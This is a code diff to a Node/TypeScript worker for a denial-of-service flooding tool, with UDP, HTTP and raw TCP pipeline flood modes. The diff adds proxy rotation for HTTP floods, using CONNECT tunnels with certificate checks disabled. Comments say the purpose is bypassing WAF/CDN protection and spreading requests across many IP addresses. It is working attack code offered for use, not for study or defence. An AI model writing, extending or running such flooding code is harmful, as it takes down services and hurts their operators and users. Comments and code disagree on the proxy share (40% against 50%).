@@ -8,15 +8,18 @@
 import { parentPort, workerData } from "worker_threads";
 import net from "node:net";
 import tls from "node:tls";
+import http from "node:http";
 import dgram from "node:dgram";
 import dns from "node:dns/promises";
 
 // ── Types ─────────────────────────────────────────────────────────────────
+interface ProxyConfig { host: string; port: number; }
 interface WorkerConfig {
   method:   string;
   target:   string;
   port:     number;
   threads:  number;    // this worker's share of total threads
+  proxies?: ProxyConfig[];
 }
 
 // ── Helpers ───────────────────────────────────────────────────────────────
@@ -256,17 +259,100 @@ async function runUDPFlood(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  PROXY REQUEST — routes HTTP through a proxy using native node:http
+//  Supports: HTTP targets (absolute URL) and HTTPS (CONNECT tunnel)
+// ─────────────────────────────────────────────────────────────────────────
+function fetchViaProxy(
+  targetUrl: string, proxy: ProxyConfig,
+  reqMethod: string, headers: Record<string,string>, body?: string
+): Promise<number> {
+  return new Promise((resolve) => {
+    const timeoutMs = 5000;
+    const u = new URL(targetUrl);
+    const isHttps = u.protocol === "https:";
+    const targetHost = u.hostname;
+    const targetPort = parseInt(u.port, 10) || (isHttps ? 443 : 80);
+    const reqPath = (u.pathname || "/") + (u.search || "");
+    const bodyBuf = body ? Buffer.from(body) : undefined;
+
+    const finish = (bytes: number) => resolve(bytes);
+    const fail   = ()             => resolve(100);
+
+    if (!isHttps) {
+      // HTTP through proxy — send absolute URL
+      const absHeaders = Object.assign({}, headers, {
+        Host: targetHost,
+        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
+      } as Record<string, string | undefined>);
+      // Remove undefined
+      for (const k of Object.keys(absHeaders)) if (absHeaders[k] === undefined) delete absHeaders[k];
+
+      const req = http.request({
+        host: proxy.host, port: proxy.port,
+        method: reqMethod, path: targetUrl,
+        headers: absHeaders as Record<string,string>,
+        timeout: timeoutMs,
+      }, (res) => {
+        const bytes = parseInt(res.headers["content-length"] || "0") || 450;
+        res.resume();
+        finish((bodyBuf?.length ?? 0) + bytes + 200);
+      });
+      req.on("error", fail);
+      req.on("timeout", () => { req.destroy(); fail(); });
+      if (bodyBuf) req.write(bodyBuf);
+      req.end();
+    } else {
+      // HTTPS through CONNECT tunnel
+      const sock = net.createConnection(proxy.port, proxy.host);
+      const timer = setTimeout(() => { sock.destroy(); fail(); }, timeoutMs);
+
+      sock.once("connect", () => {
+        sock.write(`CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\nProxy-Connection: keep-alive\r\n\r\n`);
+        sock.once("data", (chunk) => {
+          if (!chunk.toString().startsWith("HTTP/1.") || !chunk.toString().includes(" 200")) {
+            clearTimeout(timer); sock.destroy(); fail(); return;
+          }
+          // Upgrade to TLS over the tunnel
+          const secure = tls.connect({ socket: sock, servername: targetHost, rejectUnauthorized: false }, () => {
+            const h = Object.assign({}, headers, {
+              Host: targetHost,
+              "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
+            } as Record<string, string | undefined>);
+            for (const k of Object.keys(h)) if (h[k] === undefined) delete h[k];
+            const hdStr = Object.entries(h).map(([k,v]) => `${k}: ${v}`).join("\r\n");
+            const req   = `${reqMethod} ${reqPath} HTTP/1.1\r\n${hdStr}\r\nConnection: close\r\n\r\n`;
+            secure.write(req);
+            if (bodyBuf) secure.write(bodyBuf);
+            secure.once("data", (d) => {
+              clearTimeout(timer); secure.destroy();
+              finish((bodyBuf?.length ?? 0) + d.length + 200);
+            });
+            secure.once("error", () => { clearTimeout(timer); fail(); });
+          });
+          secure.on("error", () => { clearTimeout(timer); fail(); });
+        });
+        sock.on("error", () => { clearTimeout(timer); fail(); });
+      });
+      sock.on("error", () => { clearTimeout(timer); fail(); });
+    }
+  });
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  HTTP FLOOD — high-concurrency fetch with cache-busting + randomization
+//  When proxies are available, 40% of requests route through proxy pool
 // ─────────────────────────────────────────────────────────────────────────
 async function runHTTPFlood(
   base: string,
   threads: number,
+  proxies: ProxyConfig[],
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
   const ALL_METHODS = ["GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
   const MAX_INFLIGHT = Math.min(threads * 20, 5000);
   let inflight = 0;
+  let proxyIdx = 0;
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
@@ -279,6 +365,17 @@ async function runHTTPFlood(
     const body     = hasBody ? (Math.random() < 0.3 ? getHeavy() : buildBody(30, 120)) : undefined;
     const url      = buildUrl(base);
     const headers  = buildHeaders(hasBody, body?.length);
+
+    // Rotate through proxies for 50% of requests when proxies are available
+    const useProxy = proxies.length > 0 && Math.random() < 0.5;
+    if (useProxy) {
+      const proxy = proxies[proxyIdx % proxies.length];
+      proxyIdx++;
+      fetchViaProxy(url, proxy, method, headers as Record<string,string>, body)
+        .then(bytes => { inflight--; localPkts++; localBytes += bytes; })
+        .catch(() => { inflight--; localPkts++; localBytes += 100; });
+      return;
+    }
 
     fetch(url, {
       method,
@@ -852,11 +949,21 @@ async function runWorker() {
     await runHTTPExhaust(base, cfg.threads, ctrl.signal, onStats);
 
   } else if (cfg.method === "http-bypass") {
-    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client)
-    await runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
+    // Full fetch cycle — better for WAF/CDN bypass (real HTTP client), supports proxy rotation
+    await runHTTPFlood(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
+
+  } else if (cfg.method === "http-flood") {
+    // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
+    // Falls back to raw pipeline when no proxies (max throughput)
+    const proxies = cfg.proxies ?? [];
+    if (proxies.length > 0) {
+      await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
+    } else {
+      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+    }
 
   } else {
-    // Default for http-flood and everything else: raw TCP pipeline for maximum RPS
+    // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
     await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
   }
 }
